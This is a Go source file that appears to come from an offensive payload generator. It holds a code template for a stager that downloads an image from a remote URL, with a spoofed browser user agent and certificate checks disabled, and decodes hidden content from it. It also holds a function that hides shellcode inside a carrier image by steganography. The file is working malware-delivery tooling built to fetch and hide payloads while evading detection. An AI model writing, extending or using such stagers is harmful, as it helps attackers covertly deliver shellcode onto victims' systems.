package gengo

import (
	"bytes"
	"fmt"
	"log"
	"os"

	"github.com/DimitarPetrov/stegify/steg"
	"github.com/fatih/color"
)

const defaultagent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
const stegImport = `steg "github.com/DimitarPetrov/stegify/steg"`

const stegStager = `
	//Request url
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		os.Exit(404)
	}

	var tr *http.Transport
	tr = &http.Transport{
		TLSClientConfig: &tls.Config{ServerName: req.Host},
		Proxy:           http.ProxyFromEnvironment,
	}

	if hostname != "" {
		req.Host = hostname
	}
	req.Header.Set("User-Agent", ua)

	tr.TLSClientConfig.InsecureSkipVerify = true

	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		os.Exit(404)
	}

	var sb strings.Builder

	body, error := ioutil.ReadAll(resp.Body)
	if error != nil {
		os.Exit(503)
	}

	resp.Body.Close()

	reader := bytes.NewReader(body)

	err = steg.Decode(reader, &sb)
	if err != nil {
		os.Exit(503)
	}
	img = sb.String()
	`

const stagerImport = `
	"net/http"
	"crypto/tls"
	"io/ioutil"
	"bytes"
	"strings"
`

func createStagerImg(carrierpath, shellcode, outfile string) error {

	fmt.Printf("Creating stager image from carrier file %s\n", carrierpath)
	origImg, err := os.Open(carrierpath)
	if err != nil {
		log.Fatalf("Error opening carrier image file: %v ", err)
		return err

	}

	b := bytes.NewReader([]byte(shellcode))

	imgFile, err := os.Create(outfile)
	if err != nil {
		log.Fatalf("Error creating stager image file: %v ", err)
		return err

	}
	err = steg.Encode(origImg, b, imgFile)
	if err != nil {
		log.Fatalf("Error encoding shellcode to stager image file: %v ", err)
		return err

	}
	color.Blue("\nWrote Stager image to %s\n\n", outfile)
	imgFile.Close()

	return nil

}
